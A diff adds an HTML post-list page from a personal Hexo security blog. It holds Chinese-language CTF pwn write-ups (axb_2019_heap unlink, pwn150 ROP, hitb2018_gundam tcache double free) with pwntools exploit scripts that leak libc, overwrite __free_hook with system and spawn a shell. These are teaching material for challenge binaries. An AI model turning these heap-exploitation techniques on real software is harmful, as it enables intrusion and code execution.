@@ -1,0 +1,621 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
+<meta property="og:title" content="PIG-007">
+<meta property="og:url" content="http://pig-007.github.io/page/7/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="PIG-007">
+<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/7/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/axb_2019_heap-unlink/">axb_2019_heap-unlink</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.最开始看源码，感觉还行，能看懂，但是一旦看其他人讲unlink，感觉完全对不上，分明就是瞎搞，之后调试才发现单独的unlink攻击并不是针对chunk的，而是针对具体题目的结构体的。并且要求程序可以修改掉chunk的size位，执行向上合并从而触发unlink。</p>
+<p>2.unlink攻击流程如下：</p>
+<p>(1)找到题目中的chunklist位置，并分清结构体中是size在前还是chunk在前。</p>
+<p>(2)这里假设我们想要控制chunklist[0]中的chunk。申请chunk0,chunk1,chunk2。在chunk0中构造fakechunk，并设置：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fakechunk-&gt;fd = chunklist_addr-0x18</span><br><span class="line">fakechunk-&gt;bk = chunklist_addr-0x10</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)通过堆溢出或者off-by-one将chunk1的pre_size设置成fakechunk_size，将chunk1的size设置成fakechunk_size+chunk1_size。</p>
+<p>(4)free掉chunk1，这样就会触发向上合并，将fakechunk和chunk1合并。同时，由于合并过程中调用了unlink函数，那么chunklist[0].chunk就会指向chunlist_addr-0x18，对应的就是我们的chunk0指向chunklist_addr-0x18。</p>
+<p>▲unlink源码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br><span class="line">malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></div></figure>
+
+<p>A.首先通过fakechunk，也就是p，找到前一个chunk和后一个chunk:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的FD和BK分别为fakechunk的前一个chunk和后一个chunk，也就是chunklist_addr-0x18和chunklist_addr-0x10。</p>
+<p>B.然后过检查：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br></pre></td></tr></table></div></figure>
+
+<p>能过检查的原因就是因为FD-&gt;bk就相当于是[chunklist_addr-0x18]+[0x18]，就相当于chunklist_addr，也就是chunklist[0].chunk。而该地址中保存的内容就是fakechunk_addr。</p>
+<p>注意chunk0_addr和fakechunk_addr不是一样的，因为有chunk结构的原因，如下图，可以看到实际上chunklist[n].chunk保存的值是chunk数据部分的地址，在这里也就相当于是fakechunk_addr。所以也就能过检查。同理BK-&gt;fd相当于是[chunklist_addr-0x10]+[0x10]，等于chunklist_addr，该地址中保存的值就是fakechunk_addr。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533541.jpeg" alt="img"></p>
+<p>C.过完检查之后，就来到赋值部分</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></div></figure>
+
+<p>那么现在FD-&gt;bk = BK相当于[chunklist_addr-0x18]+[0x18]，也就是chunklist_addr中的值被赋值为chunklist_addr-0x10，之后BK-&gt;fd = FD，就是chunklist_addr中的值被赋值为chunklist_addr-0x18，所以总的来说，chunklist[0].chunk会指向chunklist_addr-0x18，也就是说我们的fakechunk指向chunklist_addr-0x18，这样就相当于可以通过修改fakechunk就可以修改chunklist这个bss段上的内容。而fakechunk又是chunk0的数据部分，完全在我们的掌控范围。</p>
+<p>(5)现在修改chunk0数据就先当于修改chunklist这个bss段上的内容。</p>
+<p>3.在这道题中，原本chunklist[0].chunk中保存的值是fakechunk_addr，我们可以修改chunklist[0].chunk中保存的值为free_hook地址，那么之后再修改chunk0数据部分就相当于修改free_hook中的内容了。那么现在就可以将free_hook保存的值修改为system的真实地址，这样在free时就相当于调用system函数，那么一旦free某个chunk，而该chunk的数据部分为binsh字符串，那么就相当于调用system(“/bin/sh”)，从而getshell.</p>
+<p>4.现在开始分析这道题目，get_input函数中存在off-by-one，banner()函数中存在格式化字符串漏洞：</p>
+<p>get_input:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533283.jpeg" alt="img"></p>
+<p>banner:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533339.jpeg" alt="img"></p>
+<p>利用格式化字符漏洞泄露Libc从而得到其它所有地址。之后通过off-by-one进行unlink攻击，构造fakechunk到chunklist这个Bss段上，修改chunklist段上的chunklist[0].chunk，使其指向free_hook_addr。之后再通过修改chunk0从而修改free_hook为system真实地址，再申请某个数据部分为binsh字符串的chunk，释放掉就能getshell。</p>
+<p>总exp如下：</p>
+<p>(1)首先增删改查函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def add(index,size,content):</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Enter the index you want to create (0-10):&#x27;,str(index))</span><br><span class="line">    p.sendlineafter(&#x27;Enter a size:&#x27;,str(size))</span><br><span class="line">    p.sendlineafter(&#x27;Enter the content:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Enter an index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Enter an index:&#x27;,str(index))</span><br><span class="line">    p.sendafter(&#x27;Enter the content:&#x27;,content)</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)利用格式化字符漏洞泄露栈上的__libc_main和main地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;%11$p%15$p&#x27;)</span><br><span class="line">p.recvuntil(&#x27;Hello,&#x27;)</span><br><span class="line">base = hex(int(p.recv(14),16)-0x116a - 28)</span><br><span class="line">libcbase = hex(int(p.recv(14),16) - 240 - libc.sym[&#x27;__libc_start_main&#x27;])</span><br><span class="line">chunklist = hex(base + 0x202060)</span><br><span class="line">free_hook = libcbase + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libcbase + libc.sym[&#x27;system&#x27;]</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)利用off-by-one向上合并chunk0和chunk1，执行unlink攻击：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0,0x98,&#x27;aaaa&#x27;)#0</span><br><span class="line">add(1,0x98,&#x27;bbbb&#x27;)#1</span><br><span class="line">add(2,0x90,&#x27;cccc&#x27;)#2</span><br><span class="line">add(3,0x90,&#x27;/bin/sh\x00&#x27;)#3</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(0x91)+p64(chunklist-0x18)+p64(chunklist-0x10)+p64(0)*14+p64(0x90)+&#x27;\xa0&#x27;</span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)修改chunklist[0].chunk指向free_hook：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">edit(0,p64(0)*3+p64(free_hook)+p64(0x10))</span><br><span class="line">#由于unlink攻击赋值之后，chunk0数据部分指向了chunklist_addr-0x18位置，所以需要填充p64(0)*3</span><br></pre></td></tr></table></div></figure>
+
+<p>(5)修改free_hook为system：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">edit(0,p64(system))</span><br></pre></td></tr></table></div></figure>
+
+<p>(6)利用free触发system，getshell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>
+
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/bugs%20bunny%20ctf%202017-pwn150/">bugs bunny ctf 2017-pwn150</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，可以发现NX enabled，并且没有RAX字段。打开IDA后可以看到在hello函数中存在栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char s; // [rsp+0h] [rbp-50h]</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">fgets(&amp;s, 192, stdin);</span><br></pre></td></tr></table></div></figure>
+
+<p>然后分析程序，汇编代码什么的，没找到有call eax之类的操作，这里就选择ROP来getshell。</p>
+<p>2.由于是64位程序，传参方式不同，依次为：rdi, rsi, rdx, rcx, r8, r9, 栈，而我们的目标是跳转system函数，让system函数读取binsh字符串，system函数又只有一个参数，所以这个参数必然需要在rdi中读取。我们的输入是位于栈上，所以需要一个pop rdi;和ret的操作命令，让我们的输入赋值给rdi寄存器。</p>
+<p>3.在哪找pop rdi; ret;也是个问题，这里有个工具可以实现ROPgadget ，在linux下可以输入：以下代码来获取代码地址。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">ROPgadget --binary pwn150 | grep &quot;pop rdi&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>4.然后需要system函数的地址，这里today函数直接call了该函数，所以可以直接用IDA在汇编中看到该地址(行的前缀)。或者先ctrl + s，在got.plt中搜索一下，发现也能找到system函数。所以这里获取system地址我们可以有两种方法：</p>
+<p>①pop rdi之后，让ret指向today函数中的call_system_地址：0x40075F</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191553103.jpeg" alt="img"></p>
+<p>②pop rdi之后，让ret指向从elf = ELF(‘./pwn150’)和system_addr = p64(elf.symbols[‘system’])中找到的地址system_addr，也就是plt表中的地址(这里其实可以直接在IDA中找到)</p>
+<p>(但是需要注意的是，这是64位程序，system函数从rdi上取值，与栈无关系，所以call和直接跳转plt差不多，但是如果是32位程序，那么布置栈的时候就需要考虑到plt表和直接call system函数的不同了。如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：</p>
+<p><strong>system函数-system函数的返回地址-sytem函数的参数。</strong></p>
+<p>但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：</p>
+<p><strong>call system函数地址-system函数参数。</strong></p>
+<p>两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)</p>
+<p>4.接下来寻找binsh字符串，但是没找到，只有sh，也可以开shell。shift+F12进入字符串后右键在十六进制中同步，之后可以对应看到sh的字符地址，由于sh之后直接就是结束字符00，不会往后多读，而只会读取sh，所以可以直接将该字符串的地址写在pop rdi地址后面，直接赋值给rdi，写进去。</p>
+<p>5.编写payload，顺序为：payload = padding + pop_rdi_addr + bin_sh_addr + system_addr（或者是call_system_addr）。</p>
+<p>▲由于64位程序中通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。也就是ROPgadget –pwn150 | grep “pop rdi”这段代码获取。所以进入system中用call和return直接进都行，参数是从rdi中获取的，进去之后栈上的返回地址是啥都没关系，因为已经getshell，用不到。</p>
+<p>▲执行call func_addr指令相当于push eip ;jmp func_addr，而执行plt表中地址则相当于只有jmp func_addr，没有前面的push eip，所以需要手动设置这个eip，而call则不用。注意这是32位程序下，64位程序下则按照本篇所说，直接pop rdi即可。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/hitb2018_gundam/">hitb2018_gundam</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，保护全开。IDA打开找漏洞，在删除函数sub_D32()中存在Double free和UAF漏洞：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515866.jpeg" alt="img"></p>
+<p>通过逆向分析，结构体重整化：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct gundam</span><br><span class="line">&#123;</span><br><span class="line">int flag;</span><br><span class="line">char *name;</span><br><span class="line">char type[24];</span><br><span class="line">&#125;gundam;</span><br><span class="line"></span><br><span class="line">struct gundam* factory[9]</span><br></pre></td></tr></table></div></figure>
+
+<p>之后如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515821.jpeg" alt="img"></p>
+<p>(1)Double free:可以看到在删除函数中，程序通过factory[idx]和count来判断gundam是否存在，并且只是free掉了factory[idx]-&gt;name这个chunk，并且将flag置空，但是并没有将factory[idx]这个指针置空。而且这是在Tcache机制下，没有对Double free的检查，那么就代表如果其实我们是可以连续多次free掉factory[idx]-&gt;name这个chunk的。</p>
+<p>(2)UAF:另外factory[idx]-&gt;name这个指针也没有置空，可以通过factory[idx]再次利用，形成UAF漏洞。</p>
+<p>2.思考利用方式:由于libc版本是2.26，从unsortedbins中申请回的chunk如果不被程序更改内容，其fd和bk仍然保存，可以泄露地址。由于build的时候，没有将name这个chunk的内容初始化为0，所以该chunk如果进入unsortedbin中之后，fd被赋值为main_arena+88，那么申请回来之后，name中的bk就带有main_arena+88的地址，可以通过visit打印出来，从而计算得到，泄露libc基地址。</p>
+<p>(1)那么先填满tcache之后，再加个chunk，使其进入unsorted bin中，然后申请回来就可以得到libc地址了。</p>
+<p>(2)得到libc地址后，由于libc版本是2.26，仍然存在tcache poisoning漏洞，就可以通过Double free漏洞进行类似fastbins attack攻击。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">假如申请chunk0,chunk1，然后连续free(chunk0)两次，这样tcache bin中就是：</span><br><span class="line">chunk0.fd -&gt;chunk0，即chunk0-&gt;chunk0</span><br><span class="line">那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：</span><br><span class="line">chunk0.fd-&gt;fakechunk，即chunk0-&gt;fakechunk</span><br><span class="line">之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。</span><br><span class="line">★这个漏洞在libc2.27及之后就被修复了，即不能连续free(chunk0)两次，否则程序直接崩溃。</span><br></pre></td></tr></table></div></figure>
+
+<p>①先申请三个chunk，chunk0,chunk1,chunk2，chunk1存放binsh字符串，chunk2用来防止被topchunk吞并。之后释放chunk0两次，那么tcache中的chunk0的fd指针就会指向自己，形成：chunk0-&gt;chunk0。</p>
+<p>②之后再申请一个chunk，对应索引为0，申请回第一个chunk0，修改name内容__free_hook_addr，而name内容的前八个字节就是chunk0的fd，即tcachebin中就会由之前的chunk0-&gt;chunk0变为chunk0-&gt;__free_hook_addr</p>
+<p>③再连续申请两个chunk，对应索引为3,4，chunk4的头地址就会是__free_hook_addr-0x10，那么修改chunk4的name中的前八个字节就相当于修改_free_hook，这里使其变为system的真实地址，再free(chunk_binsh)即可getshell。</p>
+<p>3.编写exp:</p>
+<p>(1)前置增删改查函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def build(name):</span><br><span class="line">    io.sendlineafter(&#x27; :&#x27;, &quot;1&quot;)</span><br><span class="line">    io.sendafter(&#x27; :&#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27; :&#x27;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def visit():</span><br><span class="line">    io.sendlineafter(&#x27; :&#x27;, &quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def destory(idx):</span><br><span class="line">    io.sendlineafter(&#x27; :&#x27;, &quot;3&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def blow():</span><br><span class="line">    io.sendlineafter(&#x27; :&#x27;, &quot;4&quot;)</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)泄露地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#创建9个chunk,再删除9个chunk,7个进入tcache,1个进入unsortedbin,1个进入topchunk,这里由于有个0x28的gundam_chunk在，所以不会全部都进入topchunk</span><br><span class="line">for i in xrange(9):</span><br><span class="line">    build(&quot;AAAA&quot;)</span><br><span class="line">for i in xrange(9):</span><br><span class="line">    destory(i)</span><br><span class="line">blow()</span><br><span class="line">#为了清空count</span><br><span class="line"></span><br><span class="line">#清空tcachebin之后再申请一个chunk就是unsortedbin中的</span><br><span class="line">for i in xrange(7):</span><br><span class="line">    build(&#x27;BBBBBBBB&#x27;)</span><br><span class="line">build(&#x27;CCCCCCCC&#x27;)</span><br><span class="line"></span><br><span class="line">#leak:</span><br><span class="line">visit()</span><br><span class="line">main_arena = 0x3dac20</span><br><span class="line">libc.address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#x27;\0&#x27;)) - 88 - main_arena</span><br><span class="line">success(&quot;libc -&gt; &#123;:#x&#125;&quot;.format(libc.address))</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)清空count，方便计算索引:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">for i in xrange(8):</span><br><span class="line">    destory(i)</span><br><span class="line">blow()</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)利用tcache poisoning和double free漏洞，getshell:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">build(&quot;0000&quot;)</span><br><span class="line">build(&quot;/bin/sh\0&quot;)</span><br><span class="line">build(&quot;2222&quot;)</span><br><span class="line">destory(0)</span><br><span class="line">destory(0)</span><br><span class="line">build(p64(libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">build(&quot;/bin/sh\0&quot;)</span><br><span class="line">build(p64(libc.sym[&#x27;system&#x27;]))</span><br><span class="line">destory(1)#1或者3都可以</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>▲这个泄露地址的漏洞在没有tcache机制的libc版本中都可以用，但是tcache poisoning只有libc2.26才可以用</p>
+<p>参考资料：</p>
+<p>ctf-all-in-one</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/how2heap_libc2.27_summary/">how2heap_libc2.27_summary</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>\1. fastbin_dup:<br>填满Tcache后free(a),free(b),free(a)之后即可。</p>
